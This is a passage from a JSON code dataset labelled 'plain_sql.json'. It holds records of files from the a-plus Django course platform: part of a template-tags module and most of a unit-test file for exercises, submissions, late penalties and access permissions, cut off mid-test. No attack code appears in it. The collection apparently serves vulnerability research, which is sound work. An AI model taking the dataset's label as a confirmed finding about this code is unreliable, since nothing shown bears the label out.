_points_data(obj)\n\n\n@register.inclusion_tag(\"exercise/_points_badge.html\")\ndef points_badge(obj, classes=None):\n    return _points_data(obj, classes)\n\n\n@register.assignment_tag(takes_context=True)\ndef max_group_size(context):\n    points = _prepare_context(context)\n    return points.total()['max_group_size']\n\n\n@register.assignment_tag(takes_context=True)\ndef min_group_size(context):\n    points = _prepare_context(context)\n    return points.total()['min_group_size']\n\n\n@register.assignment_tag(takes_context=True)\ndef module_accessible(context, entry):\n    t = entry.get('opening_time')\n    if t and t > _prepare_now(context):\n        return False\n    if entry.get('requirements'):\n        points = _prepare_context(context)\n        module = CourseModule.objects.get(id=entry['id'])\n        return module.are_requirements_passed(points)\n    return True\n\n\n@register.assignment_tag\ndef get_grading_errors(submission):\n    if not isinstance(submission.grading_data, dict):\n        return \"\"\n    grading_data = submission.grading_data.get('grading_data')\n    if not isinstance(grading_data, str):\n        return \"\"\n    if grading_data.startswith('<pre>'):\n        return grading_data[5:-6]\n    try:\n        return json.loads(grading_data).get('errors', \"\")\n    except (AttributeError, TypeError, ValueError):\n        return \"\"\n\n\n@register.inclusion_tag(\"exercise/_text_stats.html\", takes_context=True)\ndef exercise_text_stats(context, exercise):\n    if not 'instance' in context:\n        raise TagUsageError()\n    instance = context['instance']\n\n    if not 'student_count' in context:\n        context['student_count'] = instance.students.count()\n    total = context['student_count']\n\n    if isinstance(exercise, int):\n        num = instance.students.filter(submissions__exercise_id=exercise).distinct().count()\n    else:\n        num = exercise.number_of_submitters() if exercise else 0\n    return {\n        \"number\": num,\n        \"percentage\": int(100 * num / total) if total else 0,\n    }\n\n@register.simple_tag\ndef get_format_info(format):\n    format_infos = {\n        'json' : {\n            'name': 'json',\n            'verbose_name': 'JSON',\n        },\n        'csv': {\n            'name': 'csv',\n            'verbose_name': 'CSV',\n        },\n        'excel.csv': {\n            'name': 'excel.csv',\n            'verbose_name': _('Excel compatible CSV'),\n        },\n    }\n    try:\n        return format_infos[format]\n    except KeyError as e:\n        raise RuntimeError('Invalid format: \\'{}\\''.format(format)) from e\n\n@register.simple_tag\ndef get_format_info_list(formats):\n    return [get_format_info(format) for format in formats.split()]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/exercise/tests.py",
        "source": "from datetime import datetime, timedelta\nimport json\nimport os.path\nimport urllib\n\nfrom django.conf import settings\nfrom django.contrib.auth.models import User\nfrom django.core.exceptions import ValidationError\nfrom django.core.urlresolvers import reverse\nfrom django.test import TestCase\nfrom django.test.client import RequestFactory\nfrom django.utils import timezone\nfrom django.utils.datastructures import MultiValueDict\n\nfrom course.models import Course, CourseInstance, CourseHook, CourseModule, \\\n    LearningObjectCategory\nfrom deviations.models import DeadlineRuleDeviation, \\\n    MaxSubmissionsRuleDeviation\nfrom exercise.exercise_summary import UserExerciseSummary\nfrom exercise.models import BaseExercise, StaticExercise, \\\n    ExerciseWithAttachment, Submission, SubmittedFile, LearningObject\nfrom exercise.protocol.exercise_page import ExercisePage\n\n\nclass ExerciseTest(TestCase):\n    def setUp(self):\n        self.user = User(username=\"testUser\", first_name=\"First\", last_name=\"Last\")\n        self.user.set_password(\"testPassword\")\n        self.user.save()\n\n        self.grader = User(username=\"grader\")\n        self.grader.set_password(\"graderPassword\")\n        self.grader.save()\n\n        self.teacher = User(username=\"staff\", is_staff=True)\n        self.teacher.set_password(\"staffPassword\")\n        self.teacher.save()\n\n        self.user2 = User(username=\"testUser2\", first_name=\"Strange\", last_name=\"Fellow\")\n        self.user2.set_password(\"testPassword2\")\n        self.user2.save()\n\n        self.course = Course.objects.create(\n            name=\"test course\",\n            code=\"123456\",\n            url=\"Course-Url\"\n        )\n        self.course.teachers.add(self.teacher.userprofile)\n\n        self.today = timezone.now()\n        self.yesterday = self.today - timedelta(days=1)\n        self.tomorrow = self.today + timedelta(days=1)\n        self.two_days_from_now = self.tomorrow + timedelta(days=1)\n        self.three_days_from_now = self.two_days_from_now + timedelta(days=1)\n\n        self.course_instance = CourseInstance.objects.create(\n            instance_name=\"Fall 2011 day 1\",\n            starting_time=self.today,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"T-00.1000_d1\",\n            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLMENT_AUDIENCE,\n        )\n        self.course_instance.assistants.add(self.grader.userprofile)\n\n        self.course_module = CourseModule.objects.create(\n            name=\"test module\",\n            url=\"test-module\",\n            points_to_pass=15,\n            course_instance=self.course_instance,\n            opening_time=self.today,\n            closing_time=self.tomorrow\n        )\n\n        self.course_module_with_late_submissions_allowed = CourseModule.objects.create(\n            name=\"test module\",\n            url=\"test-module-late\",\n            points_to_pass=50,\n            course_instance=self.course_instance,\n            opening_time=self.today,\n            closing_time=self.tomorrow,\n            late_submissions_allowed=True,\n            late_submission_deadline=self.two_days_from_now,\n            late_submission_penalty=0.2\n        )\n\n        self.old_course_module = CourseModule.objects.create(\n            name=\"test module\",\n            url=\"test-module-old\",\n            points_to_pass=15,\n            course_instance=self.course_instance,\n            opening_time=self.yesterday,\n            closing_time=self.today\n        )\n\n        self.learning_object_category = LearningObjectCategory.objects.create(\n            name=\"test category\",\n            course_instance=self.course_instance,\n            points_to_pass=5\n        )\n\n        self.hidden_learning_object_category = LearningObjectCategory.objects.create(\n            name=\"hidden category\",\n            course_instance=self.course_instance\n        )\n        #self.hidden_learning_object_category.hidden_to.add(self.user.userprofile)\n\n        self.learning_object = LearningObject.objects.create(\n            name=\"test learning object\",\n            course_module=self.course_module,\n            category=self.learning_object_category,\n            url=\"l1\",\n        )\n\n        self.broken_learning_object = LearningObject.objects.create(\n            name=\"test learning object\",\n            course_module=self.course_module_with_late_submissions_allowed,\n            category=self.learning_object_category,\n            url=\"l2\",\n        )\n\n        self.base_exercise = BaseExercise.objects.create(\n            order=1,\n            name=\"test exercise\",\n            course_module=self.course_module,\n            category=self.learning_object_category,\n            url=\"b1\",\n            max_submissions=1,\n        )\n\n        self.static_exercise = StaticExercise.objects.create(\n            order=2,\n            name=\"test exercise 2\",\n            course_module=self.course_module,\n            category=self.learning_object_category,\n            url=\"s2\",\n            max_points=50,\n            points_to_pass=50,\n            service_url=\"/testServiceURL\",\n            exercise_page_content=\"test_page_content\",\n            submission_page_content=\"test_submission_content\"\n        )\n\n        self.exercise_with_attachment = ExerciseWithAttachment.objects.create(\n            order=3,\n            name=\"test exercise 3\",\n            course_module=self.course_module,\n            category=self.learning_object_category,\n            url=\"a1\",\n            max_points=50,\n            points_to_pass=50,\n            max_submissions=0,\n            files_to_submit=\"test1.txt|test2.txt|img.png\",\n            content=\"test_instructions\"\n        )\n\n        self.old_base_exercise = BaseExercise.objects.create(\n            name=\"test exercise\",\n            course_module=self.old_course_module,\n            category=self.learning_object_category,\n            url=\"b2\",\n            max_submissions=1\n        )\n\n        self.base_exercise_with_late_submission_allowed = BaseExercise.objects.create(\n            name=\"test exercise with late submissions allowed\",\n            course_module=self.course_module_with_late_submissions_allowed,\n            category=self.learning_object_category,\n            url=\"b3\",\n        )\n\n        self.submission = Submission.objects.create(\n            exercise=self.base_exercise,\n            grader=self.grader.userprofile\n        )\n        self.submission.submitters.add(self.user.userprofile)\n\n        self.submission_with_two_submitters = Submission.objects.create(\n            exercise=self.base_exercise,\n            grader=self.grader.userprofile\n        )\n        self.submission_with_two_submitters.submitters.add(self.user.userprofile)\n        self.submission_with_two_submitters.submitters.add(self.user2.userprofile)\n\n        self.late_submission = Submission.objects.create(\n            exercise=self.base_exercise,\n            grader=self.grader.userprofile\n        )\n        self.late_submission.submission_time = self.two_days_from_now\n        self.late_submission.submitters.add(self.user.userprofile)\n\n        self.submission_when_late_allowed = Submission.objects.create(\n            exercise=self.base_exercise_with_late_submission_allowed,\n            grader=self.grader.userprofile\n        )\n        self.submission_when_late_allowed.submitters.add(self.user.userprofile)\n\n        self.late_submission_when_late_allowed = Submission.objects.create(\n            exercise=self.base_exercise_with_late_submission_allowed,\n            grader=self.grader.userprofile\n        )\n        self.late_submission_when_late_allowed.submission_time = self.two_days_from_now\n        self.late_submission_when_late_allowed.submitters.add(self.user.userprofile)\n\n        self.late_late_submission_when_late_allowed = Submission.objects.create(\n            exercise=self.base_exercise_with_late_submission_allowed,\n            grader=self.grader.userprofile\n        )\n        self.late_late_submission_when_late_allowed.submission_time = self.three_days_from_now\n        self.late_late_submission_when_late_allowed.submitters.add(self.user.userprofile)\n\n        self.course_hook = CourseHook.objects.create(\n            hook_url=\"http://localhost/test_hook_url\",\n            course_instance=self.course_instance\n        )\n\n        self.deadline_rule_deviation = DeadlineRuleDeviation.objects.create(\n            exercise=self.exercise_with_attachment,\n            submitter=self.user.userprofile,\n            extra_minutes=1440  # One day\n        )\n\n    def test_learning_object_category_unicode_string(self):\n        self.assertEqual(\"test category\", str(self.learning_object_category))\n        self.assertEqual(\"hidden category\", str(self.hidden_learning_object_category))\n\n    #def test_learning_object_category_hiding(self):\n    #    self.assertFalse(self.learning_object_category.is_hidden_to(self.user.userprofile))\n    #    self.assertFalse(self.learning_object_category.is_hidden_to(self.grader.userprofile))\n    #    self.assertTrue(self.hidden_learning_object_category.is_hidden_to(self.user.userprofile))\n    #    self.assertFalse(self.hidden_learning_object_category.is_hidden_to(self.grader.userprofile))\n\n    #    self.hidden_learning_object_category.set_hidden_to(self.user.userprofile, False)\n    #    self.hidden_learning_object_category.set_hidden_to(self.grader.userprofile)\n\n    #    self.assertFalse(self.hidden_learning_object_category.is_hidden_to(self.user.userprofile))\n    #    self.assertTrue(self.hidden_learning_object_category.is_hidden_to(self.grader.userprofile))\n\n    #    self.hidden_learning_object_category.set_hidden_to(self.user.userprofile, True)\n    #    self.hidden_learning_object_category.set_hidden_to(self.grader.userprofile, False)\n\n    #    self.assertTrue(self.hidden_learning_object_category.is_hidden_to(self.user.userprofile))\n    #    self.assertFalse(self.hidden_learning_object_category.is_hidden_to(self.grader.userprofile))\n\n    def test_learning_object_clean(self):\n        try:\n            self.learning_object.clean()\n        except ValidationError:\n            self.fail()\n        self.assertRaises(ValidationError, self.broken_learning_object.clean())\n\n    def test_learning_object_course_instance(self):\n        self.assertEqual(self.course_instance, self.learning_object.course_instance)\n        self.assertEqual(self.course_instance, self.broken_learning_object.course_instance)\n\n    def test_base_exercise_one_has_submissions(self):\n        self.assertFalse(self.base_exercise.one_has_submissions([self.user.userprofile])[0])\n        self.assertTrue(self.static_exercise.one_has_submissions([self.user.userprofile])[0])\n        self.assertTrue(self.exercise_with_attachment.one_has_submissions([self.user.userprofile])[0])\n        self.submission.set_error()\n        self.submission.save()\n        self.submission_with_two_submitters.set_error()\n        self.submission_with_two_submitters.save()\n        self.late_submission.set_error()\n        self.late_submission.save()\n        self.assertTrue(self.base_exercise.one_has_submissions([self.user.userprofile])[0])\n\n    def test_base_exercise_max_submissions(self):\n        self.assertEqual(1, self.base_exercise.max_submissions_for_student(self.user.userprofile))\n        self.assertEqual(10, self.static_exercise.max_submissions_for_student(self.user.userprofile))\n        self.assertEqual(0, self.exercise_with_attachment.max_submissions_for_student(self.user.userprofile))\n\n    def test_base_exercise_submissions_for_student(self):\n        self.assertEqual(3, len(self.base_exercise.get_submissions_for_student(self.user.userprofile)))\n        self.assertEqual(0, len(self.static_exercise.get_submissions_for_student(self.user.userprofile)))\n        self.assertEqual(0, len(self.exercise_with_attachment.get_submissions_for_student(self.user.userprofile)))\n        self.submission.set_error()\n        self.submission.save()\n        self.assertEqual(3, len(self.base_exercise.get_submissions_for_student(self.user.userprofile)))\n        self.assertEqual(2, len(self.base_exercise.get_submissions_for_student(self.user.userprofile, True)))\n\n    def test_base_exercise_is_open(self):\n        self.assertTrue(self.base_exercise.is_open())\n        self.assertTrue(self.static_exercise.is_open())\n        self.assertTrue(self.exercise_with_attachment.is_open())\n        self.assertFalse(self.old_base_exercise.is_open())\n        self.assertFalse(self.base_exercise.is_open(self.yesterday))\n        self.assertFalse(self.static_exercise.is_open(self.yesterday))\n        self.assertFalse(self.exercise_with_attachment.is_open(self.yesterday))\n        self.assertTrue(self.old_base_exercise.is_open(self.yesterday))\n        self.assertTrue(self.base_exercise.is_open(self.tomorrow))\n        self.assertTrue(self.static_exercise.is_open(self.tomorrow))\n        self.assertTrue(self.exercise_with_attachment.is_open(self.tomorrow))\n        self.assertFalse(self.old_base_exercise.is_open(self.tomorrow))\n\n    def test_base_exercise_one_has_access(self):\n        self.assertTrue(self.base_exercise.one_has_access([self.user.userprofile])[0])\n        self.assertTrue(self.static_exercise.one_has_access([self.user.userprofile])[0])\n        self.assertTrue(self.exercise_with_attachment.one_has_access([self.user.userprofile])[0])\n        self.assertFalse(self.old_base_exercise.one_has_access([self.user.userprofile])[0])\n        self.assertFalse(self.base_exercise.one_has_access([self.user.userprofile], self.yesterday)[0])\n        self.assertFalse(self.static_exercise.one_has_access([self.user.userprofile], self.yesterday)[0])\n        self.assertFalse(self.exercise_with_attachment.one_has_access([self.user.userprofile], self.yesterday)[0])\n        self.assertTrue(self.old_base_exercise.one_has_access([self.user.userprofile], self.yesterday)[0])\n        self.assertTrue(self.base_exercise.one_has_access([self.user.userprofile], self.tomorrow)[0])\n        self.assertTrue(self.static_exercise.one_has_access([self.user.userprofile], self.tomorrow)[0])\n        self.assertTrue(self.exercise_with_attachment.one_has_access([self.user.userprofile], self.tomorrow)[0])\n        self.assertFalse(self.old_base_exercise.one_has_access([self.user.userprofile], self.tomorrow)[0])\n\n    def test_base_exercise_submission_allowed(self):\n        status, errors, students = (\n            self.base_exercise.check_submission_allowed(self.user.userprofile))\n        self.assertNotEqual(status, self.base_exercise.SUBMIT_STATUS.ALLOWED)\n        self.assertEqual(len(errors), 1)\n        json.dumps(errors)\n        self.assertNotEqual(\n            self.static_exercise.check_submission_allowed(self.user.userprofile)[0],\n            self.static_exercise.SUBMIT_STATUS.ALLOWED)\n        self.course_instance.enroll_student(self.user)\n        self.assertEqual(\n            self.static_exercise.check_submission_allowed(self.user.userprofile)[0],\n            self.static_exercise.SUBMIT_STATUS.ALLOWED)\n        self.assertEqual(\n            self.exercise_with_attachment.check_submission_allowed(self.user.userprofile)[0],\n            self.static_exercise.SUBMIT_STATUS.ALLOWED)\n        self.assertNotEqual(\n            self.old_base_exercise.check_submission_allowed(self.user.userprofile)[0],\n            self.old_base_exercise.SUBMIT_STATUS.ALLOWED)\n\n        self.assertEqual(\n            self.base_exercise.check_submission_allowed(self.grader.userprofile)[0],\n            self.base_exercise.SUBMIT_STATUS.ALLOWED)\n        self.assertEqual(\n            self.static_exercise.check_submission_allowed(self.grader.userprofile)[0],\n            self.static_exercise.SUBMIT_STATUS.ALLOWED)\n        self.assertEqual(\n            self.exercise_with_attachment \\\n                .check_submission_allowed(self.grader.userprofile)[0],\n            self.exercise_with_attachment.SUBMIT_STATUS.ALLOWED)\n        self.assertEqual(\n            self.old_base_exercise.check_submission_allowed(self.grader.userprofile)[0],\n            self.old_base_exercise.SUBMIT_STATUS.ALLOWED)\n\n    def test_base_exercise_submission_deviation(self):\n        self.assertFalse(self.base_exercise.one_has_submissions([self.user.userprofile])[0])\n        deviation = MaxSubmissionsRuleDeviation.objects.create(\n            exercise=self.base_exercise,\n            submitter=self.user.userprofile,\n            extra_submissions=3\n        )\n        self.assertTrue(self.base_exercise.one_has_submissions([self.user.userprofile])[0])\n\n    def test_base_exercise_deadline_deviation(self):\n        self.assertFalse(self.old_base_exercise.one_has_access([self.user.userprofile])[0])\n        deviation = DeadlineRuleDeviation.objects.create(\n            exercise=self.old_base_exercise,\n            submitter=self.user.userprofile,\n            extra_minutes=10*24*60\n        )\n        self.assertTrue(self.old_base_exercise.one_has_access([self.user.userprofile])[0])\n\n    def test_base_exercise_total_submission_count(self):\n        self.assertEqual(self.base_exercise.get_total_submitter_count(), 2)\n        self.assertEqual(self.static_exercise.get_total_submitter_count(), 0)\n        self.assertEqual(self.exercise_with_attachment.get_total_submitter_count(), 0)\n\n    def test_base_exercise_unicode_string(self):\n        self.assertEqual(\"1.1 test exercise\", str(self.base_exercise))\n        self.assertEqual(\"1.2 test exercise 2\", str(self.static_exercise))\n        self.assertEqual(\"1.3 test exercise 3\", str(self.exercise_with_attachment))\n\n    def test_base_exercise_absolute_url(self):\n        self.assertEqual(\"/Course-Url/T-00.1000_d1/test-module/b1/\", self.base_exercise.get_absolute_url())\n        self.assertEqual(\"/Course-Url/T-00.1000_d1/test-module/s2/\", self.static_exercise.get_absolute_url())\n        self.assertEqual(\"/Course-Url/T-00.1000_d1/test-module/a1/\", self.exercise_with_attachment.get_absolute_url())\n\n    def test_base_exercise_async_url(self):\n        request = RequestFactory().request(SERVER_NAME='localhost', SERVER_PORT='8001')\n        language = 'en'\n        # the order of the parameters in the returned service url is non-deterministic, so we check the parameters separately\n        split_base_exercise_service_url = self.base_exercise._build_service_url(language, request, [self.user.userprofile], 1, 'exercise', 'service').split(\"?\")\n        split_static_exercise_service_url = self.static_exercise._build_service_url(language, request, [self.user.userprofile], 1, 'exercise', 'service').split(\"?\")\n        self.assertEqual(\"\", split_base_exercise_service_url[0])\n        self.assertEqual(\"/testServiceURL\", split_static_exercise_service_url[0])\n        # a quick hack to check whether the parameters are URL encoded\n        self.assertFalse(\"/\" in split_base_exercise_service_url[1] or \":\" in split_base_exercise_service_url[1])\n        self.assertFalse(\"/\" in split_static_exercise_service_url[1] or \":\" in split_static_exercise_service_url[1])\n        # create dictionaries from the parameters and check each value. Note: parse_qs changes encoding back to regular utf-8\n        base_exercise_url_params = urllib.parse.parse_qs(split_base_exercise_service_url[1])\n        static_exercise_url_params = urllib.parse.parse_qs(split_static_exercise_service_url[1])\n        self.assertEqual(['100'], base_exercise_url_params['max_points'])\n        self.assertEqual('http://localhost:8001/service', base_exercise_url_params['submission_url'][0][:40])\n        self.assertEqual(['50'], static_exercise_url_params['max_points'])\n        self.assertEqual(['http://localhost:8001/service'], static_exercise_url_params['submission_url'])\n\n    def test_static_exercise_load(self):\n        request = RequestFactory().request(SERVER_NAME='localhost', SERVER_PORT='8001')\n        static_exercise_page = self.static_exercise.load(request, [self.user.userprofile])\n        self.assertIsInstance(static_exercise_page, ExercisePage)\n        self.assertEqual(\"test_page_content\", static_exercise_page.content)\n\n    def test_static_exercise_grade(self):\n        request = RequestFactory().request(SERVER_NAME='localhost', SERVER_PORT='8001')\n        sub = Submission.objects.create_from_post(self.static_exercise, [self.user.userprofile], request)\n        static_exercise_page = self.static_exercise.grade(request, sub)\n        self.assertIsInstance(static_exercise_page, ExercisePage)\n        self.assertTrue(static_exercise_page.is_accepted)\n        self.assertEqual(\"test_submission_content\", static_exercise_page.content)\n\n    def test_exercise_upload_dir(self):\n        from exercise.exercise_models import build_upload_dir\n        self.assertEqual(\"course_instance_1/exercise_attachment_5/test_file_name\",\n                         build_upload_dir(self.exercise_with_attachment, \"test_file_name\"))\n\n    def test_exercise_with_attachment_files_to_submit(self):\n        files = self.exercise_with_attachment.get_files_to_submit()\n        self.assertEqual(3, len(files))\n        self.assertEqual(\"test1.txt\", files[0])\n        self.assertEqual(\"test2.txt\", files[1])\n        self.assertEqual(\"img.png\", files[2])\n\n    def test_exercise_with_attachment_load(self):\n        request = RequestFactory().request(SERVER_NAME='localhost', SERVER_PORT='8001')\n        exercise_with_attachment_page = self.exercise_with_attachment.load(request, [self.user.userprofile])\n        self.assertIsInstance(exercise_with_attachment_page, ExercisePage)\n        c = exercise_with_attachment_page.content\n        self.assertTrue('test_instructions' in c)\n        self.assertTrue('test1.txt' in c and 'test2.txt' in c and \"img.png\" in c)\n\n    def test_submission_files(self):\n        self.assertEqual(0, len(self.submission.files.all()))\n        self.submission.add_files(MultiValueDict({\n            \"key1\": [\"test_file1.txt\", \"test_file2.txt\"],\n            \"key2\": [\"test_image.png\", \"test_audio.wav\", \"test_pdf.pdf\"]\n        }))\n        self.assertEqual(5, len(self.submission.files.all()))\n\n    def test_submission_points(self):\n        try:\n            self.submission.set_points(10, 5)\n            self.fail(\"Should not be able to set points higher than max points!\")\n        except AssertionError:\n            self.submission.set_points(5, 10)\n            self.assertEqual(50, self.submission.grade)\n            self.late_submission_when_late_allowed.set_points(10, 10)\n            self.assertEqual(80, self.late_submission_when_late_allowed.grade)\n\n    def test_submission_late_penalty_applied(self):\n        self.submission.set_points(5, 10)\n        self.late_submission.set_points(5, 10)\n        self.submission_when_late_allowed.set_points(5, 10)\n        self.late_submission_when_late_allowed.set_points(5, 10)\n        self.late_late_submission_when_late_allowed.set_points(5, 10)\n        self.assertFalse(self.submission.late_penalty_applied)\n        self.assertTrue(self.late_submission.late_penalty_applied is not None)\n        self.assertAlmostEqual(self.late_submission.late_penalty_applied, 0.0)\n        self.assertEqual(self.late_submission.service_points, 5)\n        self.assertEqual(self.late_submission.grade, 50)\n        self.assertFalse(self.submission_when_late_allowed.late_penalty_applied)\n        self.assertTrue(self.late_submission_when_late_allowed.late_penalty_applied)\n        self.assertTrue(self.late_late_submission_when_late_allowed.late_penalty_applied)\n        self.assertAlmostEqual(self.late_late_submission_when_late_allowed.late_penalty_applied, 0.2)\n        self.assertEqual(self.late_late_submission_when_late_allowed.service_points, 5)\n        self.assertEqual(self.late_late_submission_when_late_allowed.grade, 40)\n        deviation = DeadlineRuleDeviation.objects.create(\n            exercise=self.base_exercise_with_late_submission_allowed,\n            submitter=self.user.userprofile,\n            extra_minutes=10*24*60,\n            without_late_penalty=True\n        )\n        self.late_late_submission_when_late_allowed.set_points(5, 10)\n        self.assertFalse(self.late_late_submission_when_late_allowed.late_penalty_applied)\n        deviation.without_late_penalty=False\n        deviation.save()\n        self.late_late_submission_when_late_allowed.set_points(5, 10)\n        self.assertAlmostEqual(self.late_late_submission_when_late_allowed.late_penalty_applied, 0.2)\n\n    def test_early_submission(self):\n        self.course_module_with_late_submissions_allowed.opening_time = self.tomorrow\n        submission = Submission.objects.create(\n            exercise=self.base_exercise_with_late_submission_allowed,\n            grader=self.grader.userprofile\n        )\n        submission.submitters.add(self.grader.userprofile)\n        submission.set_points(10, 10)\n        self.assertFalse(submission.late_penalty_applied)\n\n    def test_unofficial_submission(self):\n        self.course_module_with_late_submissions_allowed.late_submissions_allowed = False\n        self.course_module_with_late_submissions_allowed.save()\n        self.learning_object_category.accept_unofficial_submits = True\n        self.learning_object_category.save()\n\n        self.late_submission_when_late_allowed.set_points(10, 10)\n        self.late_submission_when_late_allowed.set_ready()\n        self.late_submission_when_late_allowed.save()\n        self.assertEqual(self.late_submission_when_late_allowed.grade, 100)\n        self.assertEqual(self.late_submission_when_late_allowed.status, Submission.STATUS.UNOFFICIAL)\n        summary = UserExerciseSummary(self.base_exercise_with_late_submission_allowed, self.user)\n        self.assertEqual(summary.get_submission_count(), 3)\n        self.assertEqual(summary.get_points(), 0) # unofficial points are not shown here\n        self.assertFalse(summary.is_graded())\n        self.assertTrue(summary.is_unofficial())\n\n        self.submission_when_late_allowed.set_points(5, 10)\n        self.submission_when_late_allowed.set_ready()\n        self.submission_when_late_allowed.save()\n        self.assertEqual(self.submission_when_late_allowed.grade, 50)\n        self.assertEqual(self.submission_when_late_allowed.status, Submission.STATUS.READY)\n        summary = UserExerciseSummary(self.base_exercise_with_late_submission_allowed, self.user)\n        self.assertEqual(summary.get_points(), 50)\n        self.assertTrue(summary.is_graded())\n        self.assertFalse(summary.is_unofficial())\n\n        sub = Submission.objects.create(\n            exercise=self.base_exercise_with_late_submission_allowed,\n            grader=self.grader.userprofile\n        )\n        sub.submission_time = self.two_days_from_now + timedelta(days = 1)\n        sub.save()\n        sub.submitters.add(self.user.userprofile)\n        sub.set_points(10, 10)\n        sub.save()\n        summary = UserExerciseSummary(self.base_exercise_with_late_submission_allowed, self.user)\n        self.assertEqual(summary.get_points(), 50)\n        self.assertTrue(summary.is_graded())\n        self.assertFalse(summary.is_unofficial())\n\n    def test_unofficial_max_submissions(self):\n        self.learning_object_category.accept_unofficial_submits = True\n        self.learning_object_category.save()\n        res = self.base_exercise.one_has_submissions([self.user.userprofile])\n        self.assertFalse(res[0] and len(res[1]) == 0)\n        self.submission.set_points(1, 10)\n        self.submission.set_ready()\n        self.submission.save()\n        self.assertEqual(self.submission.status, Submission.STATUS.UNOFFICIAL)\n\n    def test_submission_unicode_string(self):\n        self.assertEqual(\"1\", str(self.submission))\n        self.assertEqual(\"2\", str(self.submission_with_two_submitters))\n        self.assertEqual(\"3\", str(self.late_submission))\n        self.assertEqual(\"4\", str(self.submission_when_late_allowed))\n        self.assertEqual(\"5\", str(self.late_submission_when_late_allowed))\n        self.assertEqual(\"6\", str(self.late_late_submission_when_late_allowed))\n\n    def test_submission_status(self):\n        self.assertEqual(\"initialized\", self.submission.status)\n        self.assertFalse(self.submission.is_graded)\n        self.submission.set_error()\n        self.assertEqual(\"error\", self.submission.status)\n        self.assertFalse(self.submission.is_graded)\n        self.submission.set_waiting()\n        self.assertEqual(\"waiting\", self.submission.status)\n        self.assertFalse(self.submission.is_graded)\n        self.submission.set_error()\n        self.assertEqual(\"error\", self.submission.status)\n        self.assertFalse(self.submission.is_graded)\n        self.assertEqual(None, self.submission.grading_time)\n        self.submission.set_ready()\n        self.assertIsInstance(self.submission.grading_time, datetime)\n        self.assertEqual(\"ready\", self.submission.status)\n        self.assertTrue(self.submission.is_graded)\n\n    def test_submission_absolute_url(self):\n        self.assertEqual(\"/Course-Url/T-00.1000_d1/test-module/b1/submissions/1/\", self.submission.get_absolute_url())\n        self.assertEqual(\"/Course-Url/T-00.1000_d1/test-module/b1/submissions/3/\", self.late_submission.get_absolute_url())\n\n    def test_submission_upload_dir(self):\n        from exercise.submission_models import build_upload_dir\n        submitted_file1 = SubmittedFile.objects.create(\n            submission=self.submission,\n            param_name=\"testParam\"\n        )\n\n        submitted_file2 = SubmittedFile.objects.create(\n            submission=self.submission_with_two_submitters,\n            param_name=\"testParam2\"\n        )\n        self.assertEqual(\"course_instance_1/submissions/exercise_3/users_1/submission_1/test_file_name\", build_upload_dir(submitted_file1, \"test_file_name\"))\n        self.assertEqual(\"course_instance_1/submissions/exercise_3/users_1-4/submission_2/test_file_name\", build_upload_dir(submitted_file2, \"test_file_name\"))\n\n    def test_exercise_views(self):\n        upcoming_module = CourseModule.objects.create(\n            name=\"upcoming module\",\n            url=\"upcoming-module\",\n            points_to_pass=15,\n            course_instance=self.course_instance,\n            opening_time=self.two_days_from_now,\n            closing_time=self.three_days_from_now\n        )\n        upcoming_static_exercise = StaticExercise.objects.create(\n            name=\"upcoming exercise\",\n            course_module=upcoming_module,\n            category=self.learning_object_category,\n            url=\"sssss\",\n            max_points=50,\n            points_to_pass=50,\n            service_url=\"/testServiceURL\",\n            exercise_page_content=\"test_page_content\",\n            submission_page_content=\"test_submission_content\"\n        )\n        self.submission_with_two_submitters.submitters.remove(self.user.userprofile)\n        response = self.client.get(self.static_exercise.get_absolute_url())\n        self.assertEqual(response.status_code, 302)\n\n        self.client.login(username=\"testUser\", password=\"testPassword\")\n        response = self.client.get(self.static_exercise.get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.context[\"exercise\"], self.static_exercise)\n        response = self.client.get(upcoming_static_exercise.get_absolute_url())\n        self.assertEqual(response.status_code, 403)\n        response = self.client.get(self.submission.get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.context[\"submission\"], self.submission)\n        response = self.client.get(self.submission_with_two_submitters.get_absolute_url())\n        self.assertEqual(response.status_code, 403)\n\n        self.client.login(username=\"staff\", password=\"staffPassword\")\n        response = self.client.get(upcoming_static_exercise.get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n        response = self.client.get(self.submission.get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n        response = self.client.get(self.submission_with_two_submitters.get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n\n        self.client.login(username=\"grader\", password=\"graderPassword\")\n        response = self.client.get(upcoming_static_exercise.get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n        response = self.client.get(self.submission.get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n        response = self.client.get(self.submission_with_two_submitters.get_absolute_url())\n        self.assertEqual(response.status_code, 200)\n\n    def test_exercise_staff_views(self):\n        self.other_instance = CourseInstance.objects.create(\n            instance_name=\"Another\",\n            starting_time=self.today,\n            ending_time=self.tomorrow,\n            course=self.course,\n            url=\"another\"\n        )\n        self.other_instance.assistants.add(self.grader.userprofile)\n        list_submissions_url = self.base_exercise.get_submission_list_url()\n        assess_submission_url = self.submission.get_url('submission-assess')\n        response = self.client.get(list_submissions_url)\n        self.assertEqual(response.status_code, 302)\n\n        self.client.login(username=\"testUser\", password=\"testPassword\")\n        response = self.client.get(list_submissions_url)\n        self.assertEqual(response.status_code, 403)\n        response = self.client.get(assess_submission_url)\n        self.assertEqual(response.status_code, 403)\n\n        self.client.login(username=\"staff\", password=\"staffPassword\")\n        response = self.client.get(list_submissions_url)\n        self.assertEqual(response.status_code, 200)\n        response = self.client.get(assess_submission_url)\n        self.assertEqual(response.status_code, 200)\n\n        self.client.login(username=\"grader\", password=\"graderPassword\")\n        response = self.client.get(list_submissions_url)\n        self.assertEqual(response.status_code, 200)\n        response = self.client.get(assess_submission_url)\n        self.assertEqual(response.status_code, 403)\n\n        self.base_exercise.allow_assistant_grading = True\n        self.base_exercise.save()\n        response = self.client.get(assess_submission_url)\n        self.assertEqual(response.status_code, 200)\n\n        self.course_instance.assistants.clear()\n        response = self.client.get(list_submissions_url)\n        self.assertEqual(response.status_code, 403)\n\n    def test_uploading_and_viewing_file(self):\n        exercise = BaseExercise.objects.create(\n            order=4,\n            name=\"test exercise 4\",\n            course_module=self.course_module,\n            category=self.learning_object_category,\n            url=\"bbb\",\n            